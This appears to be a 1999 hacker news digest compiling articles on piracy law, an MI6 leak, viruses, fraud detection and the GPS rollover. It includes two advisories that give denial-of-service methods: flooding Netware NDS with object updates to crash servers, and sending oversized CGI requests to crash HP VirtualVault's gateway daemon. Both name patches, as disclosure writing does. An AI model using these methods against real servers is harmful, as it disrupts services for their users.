             If I try to stand outside of it and encapsulate my own themes, it would ruin it for me because I would be way too
      self-conscious, and it would ruin it for readers, too, he said.
      
             All in all, he sounds as if heÆs anxious for the book tourÆs end, so he can get back to work.
             
             I have to have a lot of privacy, a lot of quiet, a minimum of distractions to do what I do, he said. When itÆs over, 
      itÆs really over. As soon as I finish this thing, I go into a total media blackout for years.
             
             As fat as Cryptonomicon is, Stephenson still had to leave out some of the plot threads he was hoping to follow 
      and he says those tales will be told in his next novel, a sequel of sorts.
             
             The funny thing about writing books is that the stuff thatÆs out where people can see it is a year or two behind the
      stuff that youÆre doing at the moment, he said. And if things are going right, the stuff youÆre doing at the moment seems a
      lot better. ThatÆs one of the ways of trying to avoid getting a swelled head.

                                 Application : NDS
                                    Severity : High
      
      
      Synopsis
      --------
      
      It is possible to overflow the Transaction Tracking System (TTS) built into
      Novell Netware and possibly crash multiple servers.
      
      Tested configuration
      --------------------
      
      The testing was done with the following configuration:
      
      Netware 4.11, Service Pack 5B
      
      Also confirmed on Netware 4.1. All systems had 64MB RAM and 1 GB drive space.
      
      Bug(s) report
      -------------
      
      The Transaction Tracking System (TTS) is used by Novell Netware to help
      preserve the integrity of data during a system crash. If a transaction is in
      the process of being written to the hard drive when the system crashes, upon
      reboot the partial transaction is backed out preserving the integrity of the
      original data. Administrators can optionally flag a file with the TTS flag
      to add this protection (typically done with databases, especially those that
      have no rollback features).
      
      TTS by default tracks 10,000 transactions, and each instance uses a small 
      amount of memory. If a burst of transactions are sent to the server and the
      available memory is exhausted, TTS will disable. While TTS is disabled, no
      updates can be made to Netware Directory Services. This can impact any program
      or process that updates NDS, such as login. In extreme overrun cases, such as
      very large simultaneous (or near simultaneous, actually) transactions, memory
      will be depleted quick enough to crash the server.
      
      This is not entirely uncommon, as any large burst of traffic updating NDS 
      will cause the problem, such as bringing up a server after several days of
      downtime that has a Directory Services replica on it. Normally this can be
      corrected by increasing RAM or lowering the amount of transactions tracked
      from the maximum default of 10,000 down to say 5,000 by issuing the command
      SET MAXIMUM TRANSACTIONS = 5000 at the console or via ServMan, and enabling
      TTS by typing ENABLE TTS at the console.
      
      However, a malicious user with proper access can force the memory depletion
      and potentially crash a server that has a replica of the NDS database. This
      can lead to multiple near-simultaneous server crashes.
      
      Of course anyone with administrative access can do this, but they could 
      obviously do other acts that could be just as destructive, if not more so.
      What is needed is the ability to create a large number of NDS updates very
      quickly. For example, if a user has the ability to create a container and
      add objects to it, them that user has enough authority to potentially cause
      problems to TTS. Creating a container, dropping a few hundred objects into the 
      container via drag-and-drop and then deleting the container should suffice.
      
      If the server lacks a large amount of free memory, the server will quite
      possibly abend. In other cases, TTS is disabled, which is a form of Denial of
      Service. As the messages are sent across to other servers containing NDS
      replicas, they too may crash. In our test environment we were able to crash
      two servers (Netware 4.1 and Netware 4.11) with a the scenario of creating a
      container, adding a few hundred users, and then deleting the container.
      
      Solution/Workaround
      -------------------
      
      NMRC has heard reports of as many as a dozen servers crashing within a couple
      of minutes of each other, so apply the latest Service Pack for Netware 4.x on
      all servers or upgrade to Netware 5.
      
      Comments
      --------
      
      Novell has already been notified and they are obviously aware of the TTS 
      limitations (refer to the May 1997 TID 2908153 at
      http://support.novell.com/cgi-bin/search/tidfinder.cgi?2908153 for an example).
      Per Novell the latest patches for Netware 4.x correct the problem, and Netware
      5 does not have the problem at all.
      
      Thanks to Michel Labelle &lt;divebc@hotmail.com> for notifying NMRC about this
      problem.

      Penalties for Pirates May Increase 


      contributed by 1Di3h 
      A hearing of the House Judiciary Committee heard
      testimony from the FBI , The Department of Justice, and
      numerous software companies supporting proposed
      legislation that would toughen the penalties for makers
      and distributor of illegal copies of software.

      Stiffer Fines Due for Pirates?
      by Heidi Kriz 

      3:00 a.m.  13.May.99.PDT
      One out of four business software applications is pirated. 

      So testified Tim Starback, director of marketing for digital font maker Emigre, at a Wednesday hearing 
      of the House Judiciary Committee that addressed  digital copyright violations. The company joined other
      software publishers, as well as the FBI and the Department of Justice, in supporting proposed legislation
      that would toughen the penalties for makers and distributors of illegal copies of software. 

      "It's time for Congress to make the pirates pay," said Ken Wasch, president of the Software & Information
      Industry Association (SIAA). 

      Wednesday's testimony to the Subcommittee on Courts and Intellectual Property sought to advance two agenda
      items. 

      Industry reps praised proposed amendments to the current Copyright Act, introduced yesterday by 
      Representative James Rogan (R-California) and Representative Howard Coble (R-North Carolina). 

      They also sought to hurry along implementation of the Clinton administration's 1997 No Electronic Theft
      Act (NET). The latter legislation is managed by a sentencing commission, but no commissioners have been
      appointed to staff it. 

      The proposed amendments, known as the Copyright Damages Improvement Act of 1999, seek to increase fines in
      the cases of copyright violations. The current range of statutory damages, which date to 1988, vary from 
      US$500 to $20,000, according to Dan Duncan, vice president of government affairs for the SIIA. 

      Tuesday's legislative amendments propose increasing that penalty to between $750 and $30,000 -- a figure
      the industry group said is based on actual damages and lost profits. In cases of willful infringement, the
      new ceiling of damages would be raised from its current level of $100,000 to $150,000. 

      Witnesses sought to persuade Congress to clarify sentencing guidelines for criminal copyright infringements
      under the NET Act. 

      Should the legislation pass a subcommittee vote, it will then move on to a vote in the House Judiciary
      Committee, and then to a House vote.Duncan said that House members had expressed a desire to vote on the
      amendments before the upcoming congressional recess, which starts after Memorial Day. 

      Not everyone is raving about the proposed stiffer penalties. 

      An MIT computer-science student who goes by the name Phat Boy said that the fines would punish those who 
      simply share unlicensed software over the Net as much as those who seek to sell it. 

      Phat Boy cited the case of "LaMacchia," a fellow MIT student who in 1994 was fingered by authorities for posting
      licensed programs on the Net. Under the new rules, he would be fined hundreds of thousands of dollars, according
      to Phat Boy. 

      "Why should that kind of act -- maybe
      ill-advised, but certainly perpetrated in
      the generous, shareware spirit -- be
      punished with the same ferocity as a
      corporate pirateer [would be]?" said Phat
      Boy.

      How far can the influence of British intelligence reach?

      identities of Her Majesty's secret agents. 

      Richard Tomlinson used to be an agent for the British government. Ousted in 1995, Tomlinson was then imprisoned 
      in 1997 for violating a British official secrets act. After his release, he reportedly ended up in Switzerland, 
      where he started a website claiming global illegal acts by British intelligence. 

      The site was taken down at the end of April; Swiss authorities say Tomlinson had threatened to publish British
      secrets online, and they had to shut him down to prevent that. 

      Last week, Tomlinson put up a new site through the free Web-hosting service GeoCities. This time, he allegedly 
      said he was going to release sensitive details about where British intelligence offices are located. That new 
      site has now been suspended. 

      Bruce Zanca, the vice president of communications at GeoCities, says that it was simply a matter of policy.
      "People [complete] a questionnaire and agree to no illegal activities and no hate speech. It was brought to our
      attention that there were content violations; we put the site under suspension." 

      He added, "We're careful in protecting privacy for our users, so I can't get into details, but it fell under 
      the general content restrictions." 

      Next steps? "[Tomlinson] is free to [dispute the shut down] and if so, we'll start a dialog with him. If the 
      site is brought into compliance, we'll put the website back up."

     Government fears that rogue website might put lives at risk,
                  writes Michael Evans 
   
         MI6 agent list published on the Internet URGENT legal moves were ordered yesterday after an
     American website published the names of a "large number" of serving MI6 intelligence officers. 
   
     Ministry of Defence officials learnt of the new Internet website yesterday morning and immediately
     contacted Rear Admiral David Pulvercraft, Secretary of the Defence,  Press and Broadcasting Advisory 
     Committee - the D Notice Committee - to try to prevent publication of any of the names by the British
     media. 
   
     The list of MI6 names and other details about the intelligence service were regarded as a serious security
     breach. 
   
     Admiral Pulvercraft, who has no powers to stop newspapers publishing sensitive material, advised that
     publication of such details could "put lives at risk". He said that there was concern that the "long list"
     may have been put on the Internet by a former member of the Secret Intelligence Service. 
   
     Last week the Government took out a court injunction in Switzerland against Richard Tomlinson, the former MI6
     officer who was sacked from the service and was subsequently sentenced to 12 months in prison for
     breaching the Official Secrets Act. 
   
     The injunction prevented Mr Tomlinson, who now lives in Geneva, from disclosing any information about his past
     employment by MI6. The injunction covered disclosure anywhere in the world and included information put on the
     Internet. 
   
     The American website makes no mention of Mr Tomlinson, and there is no evidence that he set it up himself. 
   
     However, it was clear to Government lawyers that information on the website had come from Mr Tomlinson.
     The website refers to a disaffected MI6 officer. 
   
     John Wadham, his lawyer, said that he had threatened to put such information on the Internet. 
   
     He said Mr Tomlinson felt he had been "harassed around the world", and this was why he may have decided to take
     such action. 
   
     Mr Tomlinson has also indicated that he still hoped to publish a book. It was his attempt to sell his MI6 memoirs
     to an Australian publisher that led to his arrest and trial at the Old Bailey. He pleaded guilty to breaching the Official
     Secrets Act and was released from jail in April last year. 
   
     Although the Chief of the Secret Intelligence Service, known as "C", currently Richard Dearlove, is formally
     named by the Government on his appointment, no other members of the service are ever officially identified. 
   
     Under Defence Advisory Notice No 6, editors of newspapers are asked to seek advice from the D Notice
     Secretary before publishing such details "unless they have been widely disclosed or discussed". 
   
     Admiral Pulvercraft made clear yesterday that the identities of so many MI6 officers had not been previously disclosed,
     and he asked that the address of the website should not be published. 
   
     Steps were being taken to see how the damage arising from the disclosure of the MI6 names could be minimised. 
   
     Admiral Pulvercraft had to decide whether to make an issue of the case, knowing that by doing so he was drawing
     attention to the fact that a website had been set up. 
   
     He said yesterday that even if the website was only short-lived, he felt it was necessary to put out an advisory
     notice.

 47.0 The Virus Hype, Fact or Fiction by Thejian
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From http://www.net-security.org/
      
      THE VIRUS HYPE: FACT OR FICTION?
      by BHZ, Thursday 13th May 1999 on 9:48 pm CET
      Viruses are common threats to all computer users. From exe infectors to new-age
      Macro viruses. Our new special report goes deeper into viruses. You could read about
      "White Hats" and "Black Hats", media hype, myths and of course sollutions. So if
      you are interested read new Special Report.
      
      The Virus-hype: Fact or fiction?
      
      By now we've probably all heard of the term "computer virus". After all the 
      panic first caused by Melissa and followed up by the CIH 1.2 Chernobyl-virus 
      the mainstream computer-users now know (if they didn't know that already) 
      one of the threats of the "Information Age" by name. It's nice that we all can 
      copy and download programs and files from the internet and from each others system,
      but there are certain safety risks involved here. They have always been there
      btw, we just needed a little push to get the media coverage going. But how bad
      is it really? Every major online news service (and a lot of their printed
      collegues too) have reported about the menace the computer virus presents and
      they did a good job scaring the crap out of the clueless regular computer users,
      but how much of these stories is really true? And what is yet to come?
      
      Let's get something straight first: the first goal of most newspapers and online
      news services IS profit. They just need to sell. As do the Antivirus developers.
      This was demonstrated nicely in December last year, when the Remote Explorer-virus
      hit the network of MCI Worldcom. Eventually it was proven to be an attempt for vengeance 
      by one of the company's ex-employees. But by then the media-machine of AV-developer
      Network Associates had sadly labeled this virus, that spread through the Win NT 
      networks of the company encrypting and resizing data files, as one of the worst 
      viruses ever. This turned into just another marketing trick, in the hope to 
      sell their fix which was miraculously discovered only a week after NA and the media 
      had convinced the public that this was the big one.
      It's sad to see how some companies can put their name out to dry just to gain some
      more profit, but it's even sadder to see how easily the some journalists take over
      such a story to sell a few more papers or a little more advertising.
      
      Viruses just scare the crap out of the regular user because he doesn't know much on the
      subject.
      
      Let's look at where viruses come from for example. The main opinion on virus-writers
      and the virii-scene (VX) is almost one of hate. "Those rotten low-life computer-geeks
      who are only out for one thing: complete and utter destruction of ones data!"
      This view just shows how misinformed some people are. Of course there are some people
      out there who are really devoted to destruction, but they're to be found in every
      field. The effect some viruses have combined with the feeling of helplessness the 
      average Joe feels when infected by one is one of the primary causes of this. The
      press can be named as another, but probably one of the biggest enemies here is the
      lack of knowledge on the matter. Don't get me wrong, I don't condone virus-writing
      in any way, I just don't condemn it either. One huge point is forgotten by people
      who discuss this topic like the sky is going to fall down. Computer viruses may cause 
      damage but they have brought on immense technological development. 
      I'd rather have some "bad guys" and also a lot of "good guys" who
      research and cooperate with each other on this field and in this way help developing
      methods to protect my pc then that the scene goes completely underground, leaving the
      AV-researchers only with the opportunity to research a virus when it starts spreading.
      Think about it. I don't want to come 'round quoting Confucius to y'all, but a doctor
      that cures when an illness starts to spread will of course get more fame then one that
      prevents the illness at the first signs. But which one would you prefer to be treated by?
      The one that let's you get sick first or the one that cures you at the first detection?
      
      The virus writers' community is split (like the general hacking community) into two camps.
      They refer to themselves as "Black Hats" and "White Hats". The "Black Hats" are mostly
      interested in doing damage and sometimes release viruses through e-mail or Usenet
      newsgroups. Though there are have been a lot of discussions on this subject, virus 
      writing (leaving out the macro viruses here) requires a great amount of skill. A lot of
      the people who develop and research viruses could be called "hackers" instead of
      "vandalists", for what they do is aimed at technological progress and has certainly
      not always to do with destruction of data. This is proven by the fact that the majority 
      of computer viruses never make it "into the wild". They reside only in virus libraries 
      kept by writers and researchers.
      
      The claim that there are thousands of viruses around nowadays is, when you look at the
      above, just not accurate either. People who make these claims almost certainly work for
      the AV-companies or simply don't know what they're talking about. AV-companies count even
      the most insignificant variations of known viruses as new ones for advertising purposes.
      Most viruses are just variations on the same virus, sometimes even only differing one
      symbol in it's code or message (instead of "legalize" a variation of the good old 
      Marijuana-virus later contained the word "legalize", is this a new virus???).
      
      In general AV-software is able to detect such variations on it's own nowadays and the
      few really new ones are quickly added to upgrades which every user can simply download
      from the manufacturers site. Sure, you can never detect all of them in time and
      sometimes data is lost, but virus scanners could detect CIH 1.2 even before it struck
      on the 26th of April and these technologies are still advancing rapidly.
      
      Another myth is the one that you can only get viruses by downloading from BBS's and
      the Internet. In fact, this is one of the least common ways of infection. Most sites
      nowadays use strict policies to make sure you won't get infected through anything
      you've downloaded there. It can happen sometimes of course, but I've never heard one
      of my friends complaining about this. A big chunk of the online infection-problem lies 
      within e-mail, which spreads mostly macro-viruses.
      One of the main sources of viruses nowadays is the demand for more functions in
      our software, like the Corel or Microsoft Office scripting languages.
      WordBasic is a nice example of this. This microprogramming language which is part of 
      the Microsoft Office-package allows an user to add new functions (in the form of macro's)
      to their copies of Word, Access or Excel. Problem is that only a select group of users 
      knows how to uses this. Among them are the macro virus writers. The Melissa-macro virus is 
      a nice recent example of this. Is it really necessary to have a zillion more functions 
      if this opens up just as many new manners to attack ones data?
      Also one of the main problem lies besides downloading and employees holding a grudge the 
      with the retail packages themselves. Besides some bugs and copy-protections gone bad, a 
      lot of viruses are spread directly from the companies that might seem to be victims. For 
      example, IBM recently recalled a shipment of Aptivas which were infected with the 
      CIH-virus. 
      
      Due to monopolizing of certain lines of software using the above mentioned scripting-
      languages, the problem cause by this spreads. Also with the development of new
      functions and technologies within vulnerable packages, even more new sources for virii
      come in existence every day. "So the next generation viruses will be even more 
      destructive?", you might ask. I think the last two months have shown that. First we 
      had the Melissa-virus. All major companies shut down their networks to keep from being 
      infected and once again all AV-developers and journalists jumped on the virus-subject. 
      Only to have the "plague" called Melissa overshadowed by a new one called CIH 1.2 a 
      couple of weeks later. Where Melissa (and her variations) just caused a lot of extra 
      email-traffic, CIH 1.2 attacked the (flash) BIOS and the HD's themselves. After his 
      arrest (and release) the creator of the virus even told the press about two more 
      destructive viruses he was working on! If you combine this with the Chaos Virus Theory, 
      which predicts the advancement of future virus generations to intelligent, thinking and 
      self-evolving viruses, question arises how we can ever prevail against these evil 
      menaces?
      
      At the danger of sounding like I'm downplaying or underestimating the problem, I think
      we shouldn't panic to much on the subject though. Like I mentioned before, AV-research
      makes a lot of progress. This is mainly because of the cooperation between AV-companies
      and the virus-creators. If you start a manhunt on the latter, the first well be left
      empty-handed. The only way we will notice the new discoveries in this field then is by
      the time they've infected half the Internet. Of course we should be aware of certain
      elements in this scene, the ones insisting on inflicting damage and aiming for "Internet-
      anarchy". You can't judge a group of people by a (relatively small) segment of that
      group. Now the FBI is shutting down virii-sites like Codebreakers. While from one
      point of view this is necessary and only a logical step. While I agree that steps
      should be taken to prevent the kiddies from downloading virus-sources to impress their
      friend and in this way (intended or not) spread another infection, we shouldn't forget
      the fact that the only way to keep up and be able to actively and effectively combat
      this menace is by working together. We should beware not to force the "underground" to
      really go underground. Viruses present a very real threat, but don't get sucked into
      the hype. For all our sakes.

      THE INTERNET FRAUD COUNCIL
      by BHZ, Thursday 13th May 1999 on 4:23 pm CET
      Computer frauds cost the industry billions of dollars. Finally US authorities created
      The Internet Fraud Council - coalition of few companies that fight computer crime.
      They said that they will give their "Seal of approval" to companies that are fraud-free.
      Officials at the electronic crime center also announced yesterday a new FBI Internet
      Fraud Complaint Center, which will collect complaints from across the country. Read

      Council formed to fight Net fraud 
      By Reuters
      Special to CNET News.com
      May 11, 1999, 8:55 a.m. PT 
 
      ORLANDO, Florida--With fraud on the Internet shaping up as the multibillion-dollar crime of the 
      1990s, U.S. authorities and antifraud groups yesterday launched fresh initiatives to combat Net 
      crime.
 
      The Internet Fraud Council, a coalition of antifraud companies, said it will create a set of 
      standards for companies doing business on the Internet, a clearinghouse of information on online
      crime, and a fraud-free "seal of approval" for such businesses operating in cyberspace.
 
      "It's hard for law enforcement to keep up," John Hiatt, president of the National Coalition for the
      Prevention of Economic Crime, said at a news conference during a meeting on economic crime.
 
      "The bandits change hardware and software every six months. In law enforcement, that number is 48 
      months," he said.
 
      Paul Fichtman, chairman of the Internet Fraud Council, said estimates of the cost of Internet fraud 
      ranged from $9 billion to $108 Billion in 1998.
 
      "Clearly, there's no way anyone can estimate the amount of fraud on the Internet," he said.
 
      The Internet Fraud Council also said it would create a clearinghouse for information about online fraud.
 
      Most Internet crime involves the theft of identifying information, such as credit card or social security
      numbers from individual consumers. But thieves also steal corporate identities, posing as news services or
      financial analysts in order to float false reports that can send a stock soaring or plummeting.
 
      In April, an Internet posting of a false financial news story sent shares of PairGain Technologies, a small
      California company, soaring 31 percent, only to fall back to earth when the story proved false.
 
      "The Internet is quickly becoming a primary communications and e-commerce tool," said Norman Willox, chief 
      executive of the National Fraud Center, a white-collar antifraud firm and one of the partners in the Internet
      Fraud Council. "Fraud on the Internet is increasing exponentially. Existing efforts [to fight it] have been 
      so specialized or fragmented that they have been ineffective."
 
      Officials at the electronic crime center also announced yesterday a new FBI Internet Fraud Complaint Center, 
      which will collect complaints from across the country.
 
      Willox said he expects the two centers to work together closely.
 
      "Right now there's no tool that measures the loss from economic crime on the Internet," he said. "It doesn't
      matter which organization is first to the scene of the crime as long as they share information."
 
      "What we want to do is give people tools that make it too expensive for these guys to be fraudulent," Fichtman 
      said. "If we can do that, they'll leave the Internet and go somewhere else."

 49.0 Credit Card fraud under watchful eyes of eFalcon 'electronic brain'

      EFALCON PREYS ON CREDIT FRAUD (BUS. 3:00 am)
      http://www.wired.com/news/news/email/explode-infobeat/business/story/19662.html


      It's an open secret that the Web is still the Wild West for
      credit-card crooks. HNC Software hopes its new anti-fraud
      software, eFalcon, will change that. By Craig Bicknell.
      
      EFalcon Preys on Credit Fraud
      by Craig Bicknell 

      3:00 a.m.  13.May.99.PDT
      You may not know it, but the last time you used your credit card to buy a sporty
      new shirt at the mall, you probably had to get the nod from a big brain named
      Falcon. 

      A big electronic brain, that is. For the last six years, Falcon, software based on
      neural networks, has been analyzing the purchasing patterns of more than 260
      million credit cards. Over time, it has learned to spot the telltale signs of fraud.

      Before most credit-card processors authorize a charge, they first get Falcon's
      OK. 

      HNC Software, the creator of Falcon, hopes that online merchants will soon
      start doing the same. This week, the company launched eFalcon, a form of
      Falcon tweaked to detect the credit fraud that's so rampant online. 


      See also: Credit Card Fraud Bedevils Web 


      "Fraudulent transactions may exceed 10 percent of e-commerce merchant
      revenues.... That's a huge problem," said HNC chief Robert North. In comparison,
      fraudulent sales account for less than 1 percent of traditional retail revenues. 

      Credit-card company rules mandate that Web merchants, not consumers, pick up
      the tab for bogus charges, plus a US$25 fee. It's a big strain for a fledging
      e-commerce company. 

      EFalcon will help merchants spot potentially fraudulent transactions in a
      couple of different ways. When a user enters a credit-card number on a Web
      site, the number and information about the proposed purchase are zipped off to
      the Falcon database. There, the data will be assessed against the purchase history
      on the card and scored for likelihood of fraud. 

      EFalcon bases the score on hundreds of factors, including the amount of
      purchase, the type of merchandise and store, the time since last purchase, and
      the location of the surfer's computer. If eFalcon has never seen the card before,
      it will generate a score based on the average buying patterns of all
      cardholders. 

      The higher the score, the more likely the purchase is fraudulent. Merchants decide
      what the cutoff score will be for accepting a transaction. 

      EFalcon will also take into account the way a surfer moves around the
      merchant's site. For example, a bona fide shopper is likely to linger before making a
      purchase, while a crook heads straight for the Buy button. 

      Analysts who've taken a look at eFalcon are impressed. "I think it's going to be a
      big success," said Avivah Litan, research director for payment systems at Gartner
      Group. "They've got a lot of experience dealing with fraud in the physical world." 

      That is also its limitation, said William Donahoo, vice president of marketing at
      CyberSource, a competing firm that also makes fraud detection software for the
      Web. Unlike HNC, CyberSource has been making anti-fraud software for the Web
      exclusively, since the earliest days of e-commerce. 

      "The difference between the online world and the brick-and-mortar world is night
      and day," said Donahoo. "We're a fraud system built by the Internet and for the
      Internet." 

      Still, he's glad to see HNC entering the market. "It's a validation that they, too,
      see the need for risk-management services online. Fraud will only become a
      bigger and bigger issue as more shoppers come onto the Web."

 50.0 [ISN] A ban on unauthorized computer access in Japan to be enacted
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    
     
      From the ISN mailing list
     
      Forwarded From: "Prosser, Mike" &lt;mike.prosser@L-3Security.com>
   
         May 13, 1999 (TOKYO) -- Legislation to outlaw unauthorized access to
      computer networks will go into effect in Japan by the end of this year at
      the earliest, and the penalties will include fines or imprisonment. 
         
         The bill, sponsored jointly by the National Police Agency, the Ministry
      of Posts and Telecommunications, and the Ministry of International Trade
      and Industry (MITI), was submitted to the Diet after it was adopted at a
      Cabinet meeting on April 16. It is expected to pass the Diet by the end
      of June.
         The concerned government agencies will make the bill to ban
      unauthorized access a new law, and not simply an amendment to the Criminal
      Law or the Telecommunications Business Law. Under the terms of the
      legislation, unauthorized access is defined as "any unauthorized logging
      in to a computer network using another person's ID or password, or any
      attack on a security hole in an operating system or application." The bill
      will ban such unauthorized access. The penalties will include imprisonment
      for up to one year or fines of up to 500,000 yen. (121.03 yen = US$1) 
         Also, the bill will outlaw "any acts to promote unauthorized access" 
      such as provision or sales of a user ID and password to a third party. In
      such cases, penalties will be fines of up to 300,000 yen. Even in the
      United States and Europe, where laws banning unauthorized access have
      already been enacted, few countries ban acts to promote unauthorized
      access. 
         The bill will protect "all networked computers, those which control
      access with a user authentication via a user ID or password as well as
      authentication results" from unauthorized access. Networks will include
      the Internet, public circuits and corporate dedicated lines. 
         The new bill will not require corporate system administrators to
      "preserve log on records of protected computers," which the NPA has
      sought. Preservation of logs was excluded from the bill based on
      discussions among the three concerned parties. 
         In November 1998, the NPA sought to require companies to preserve their
      log records, based on its view that "those to be protected by the bill and
      obliged parties are identical." However, many companies said that such a
      requirement would impose a tremendous burden on them and that it wouldn't
      necessarily help prevent unauthorized access.
         Nonetheless, companies will still be expected to make their best
      efforts to preserve log records to detect any unauthorized access at an
      early stage and minimize damages. The bill will not have its intended
      effect unless companies take some measures to prevent unauthorized access. 
         Therefore, the three parties decided to ask companies to implement
      voluntary efforts to take some measures to prevent unauthorized access. 
      Specifically, system administrators are expected to manage passwords on a
      thorough basis, and to implement a variety of preventive measures. 
         Although it is not legally binding, most system administrators will
      likely implement such preventive measures on a voluntary basis.

      Virtual Vault Vulnerable 


      contributed by John Daniele 
      John Daniele has released a report that details a trivial
      DoS attack on HP's Virtual Vault operating system.
      Virtual Vault is a is a B1 and B2 DoD compliant system
      that is very popular with banks and e-commerce
      systems. HP claims to have addressed this problem in
      patch PHSS 10747 however numerous sites remain
      vulnerable.

      VirtualVault Overview
      
      The VirtualVault operating system is HP's solution to secure
      electronic commerce. It is a B1 and B2 DoD compliant system
      that is becoming increasingly popular with big business, banks, etc., 
      The main security mechanism in which VVOS is based upon is data partitioning. 
      Data on the system is classified into one of four security classes, or 'vaults' -- 
      INSIDE, OUTSIDE, SYSTEM and SYSTEM HIGH. The INSIDE vault houses the server's 
      backend applications and databases. The OUTSIDE vault generally
      contains the internet front end and any necessary CGI binaries, etc.
      SYSTEM and SYSTEM HIGH are responsible for maintaining the external
      webpages and audit logs respectively. These vaults are totally segregated
      from each other and work essentially as separate machines. If a
      program requires access to either of the vaults it must be authenticated
      by HP's Trusted Gateway Proxy daemon. The TGP daemon filters all requests
      from the internet and forwards them to middleware server packages that
      safely reside behind the INSIDE vault. 
      
      TGA Bug
      
      While the TGP daemon does a good job of ensuring the integrity of the
      request prior to forwarding data to its destination, the trusted
      gateway agent that is responsible for wrapping CGI requests does not
      check the length of the request prior to sending it to TGP. This poses
      a problem since TGA does not correctly handle request messages that 
      are more than 512 bytes in length. The result is a trivial DoS attack on
      TGA and all services being wrapped by TGA. The bug was discovered during a
      penetration test on a client system running VVOS 3.01. A post was made to
      a CGI application residing on the system with a large string of characters.
      This was then sent to the trusted gateway agent, causing the daemon 
      to crash, leaving the Netscape Enterprise Server unable to service further
      HTTP/SSL requests. The NES logs show the following:
      
      [07/May/1999:16:16:22] security: for host xxx.xxx.xxx.xxx trying to 
      GET /cgi-bin/somecgi.cgi?AAAAAAAAAAAAAAA..., vvtga_log reports: ERROR: setup_connection():
      Failed to transfer execution message to TGA daemon
      
      And when NES is started back up:

      [07/May/1999:16:33:18] failure: Error accepting connection -5993 (Resource temporarily unavailable)
      
      FIX
      
      Chris Hudel of HP was notified of this bug on Wednesday May 12, 1999. He stated
      that HP was aware of the problem and addressed it in patch PHSS 10747. However, I am not
      aware of HP releasing an official 'bug report' on this issue.
      Since I have encountered several VVOS systems this past week that have not
      been patched, and sysadmins unaware of this bug and patch, I decided to post the 
      details publicly. NOTE: I have not tested this bug against PHSS 10747 and would
      appreciate input from those who have at foo@faber.to.

      The the GaLaDRiel (or C.S.Gala) virus infects the script
      language used by Corel products. This particular version
      is not malicious and only displays a text message. The

      Virus Infects Corel Scripts 

      Virus is low risk, not easily spread, and causes minor damage.

      by Stan Miastkowski, special to PC World 
      May 13, 1999, 6:38 p.m. PT 

      A new wrinkle in computer viruses appeared this week with the discovery of a virus that infects the script
      language used by Corel products. But experts say the GaLaDRiel (or C.S.Gala) virus will affect few users, and
      is not destructive.

      The virus is not contained in the company's applications, according to a Corel representative. You
      can get it only by receiving an infected script file from another user via disk or download. When it triggers, all
      the virus does is display text.

      GaLaDRiel is "in the low-risk category," according to Sal Viveros, a spokesperson for Network Associates,
      maker of McAfee Antivirus. The virus is rare, doesn't spread easily, and causes minimal damage, Viveros
      says. 

      Although GaLaDRiel has the potential to infect other Corel Script files, it doesn't launch automatically. You
      have to run the infected script for it to spread. And the virus doesn't infect program files.

      After GaLaDRiel infects a Corel Script file, it will run its payload on June 6 only, displaying seven lines from
      J.R.R. Tolkien's The Lord of the Rings. As far as virus researchers have been able to ascertain, GaLaDRiel
      does nothing else.

      All major developers of antivirus software plan to add detection and removal of GaLaDRiel to their latest virus
      updates within the next two weeks.

      How to Check for the Virus

      Corel recommends taking the following steps to see if your scripts have been infected and to remove the virus
      if they have been:

      1. Using Windows Explorer, browse the directory that contains the potentially infected scripts.

      2. Right-click on a Corel script.csc file and select Open.

      3. When the Corel Script Editor opens, examine the first line of the script. If the text begins with REM
         ViRUS GaLaDRiel, then your script is infected.

      4. To cure the infection, delete all the script lines from REM ViRUS GaLaDRiel to REM END OF ViRUS.

      5. Resave your Corel Script file with the same name, overwriting the infected version.

      6. Repeat the above steps for all .csc files in the same directory. (This final step is important, because running
         any infected Corel Script file will infect all other .csc files in the same directory.)

      DOD Labels Attacks as "Nuisance"

      The Defense Information Agency's Joint Task Force for
      Computer Network Defense has labeled the recent
      attacks of DOD web sites by Chinese individuals as
      nothing more than a nuisance and that the attacks
      have had "no operational impact or effect."

      Pentagon confirms 'nuisance' cyberattacks

      BY BOB BREWIN (antenna@fcw.com)

      The Pentagon identified what it called "nuisance-level" attacks against its
      World Wide Web sites that resemble the attacks by Chinese hackers against
      sites operated by the departments of Energy and Interior earlier this week.

      In response to a query from FCW about any Chinese attacks against DOD
      Web sites, a spokeswoman for the Defense Information Agency's Joint Task
      Force for Computer Network Defense said, "We're aware of the activities you
      mention. The JTF-CND has only a few isolated reports of activities across
      DOD which might be attributed to these sources. The damage has been at the
      'nuisance level' with no operational impact or effect."

      The spokeswoman added that the JTF-CND would take action only when such
      attacks would have a "widespread effect" on the Defense Information
      Infrastructure, which comprises global DOD networks and information systems,
      or when such attacks are spread broadly across network or information systems
      operated by more than one of the services.

      According to nongovernment network security experts, Chinese hackers
      launched Web attacks earlier this week in response to the U.S. bombing of the
      Chinese embassy in Belgrade.

 54.0 GPS's Y2K crisis comes early

      From HNN http://www.hackernews.com/
      
      Jan 1, 2000 or Aug 21, 1999, which is worse? 


      contributed by Time L0rd 
      By now everyone has heard of Y2K. How many have
      heard of August 21? That is the date when many
      handheld GPS systems may go wacko. The GPS
      satellites keep track of dates by measuring the number
      of weeks elapsed since January 5-6, 1980. Every 1,024
      weeks, the timer will resets to zero. The first time this
      will happen is August 21. People suspect that older GPS
      units may not be able to read this time accurately. (I
      knew there was a reason I waited buy one) 

      CNN
       
      Experts say consumers may
      be hardest hit by GPS
      computer time change

      May 12, 1999 
      Web posted at: 7:35 PM EDT (2335 GMT) 

      WASHINGTON (AP) -- By now everyone knows about computers and
      midnight, December 31. But what's going to happen on August 21? 

      That's when computer clocks roll over in the Global Positioning System, the
      network of satellites that keeps ships and nuclear missiles on course and
      provides precise time measurements for computer networks and public
      utilities. 

      A joint congressional subcommittee held a hearing Wednesday to assess the
      potential impact. It heard that while the military and space communities are
      ready for the adjustment, consumers and small businesses may be the hardest
      hit. 

      The Global Positioning System is made up of 24 orbiting satellites that allow
      anyone with a GPS receiver to pinpoint their position on Earth. The satellites
      keep track of dates by measuring the number of weeks elapsed since January
      5-6, 1980. Every 1,024 weeks, the timer will reset to zero, which will occur for
      the first time as August 21 turns to August 22. 

      "The satellites will not fall out of the sky, they will not lose their power," Keith
      Rhodes, technical director in the Office of the Chief Scientist at the General
      Accounting Office, told members of the House Science and Government
      Reform committees. "The problem will be on the ground, with what you hold
      in your hand." 

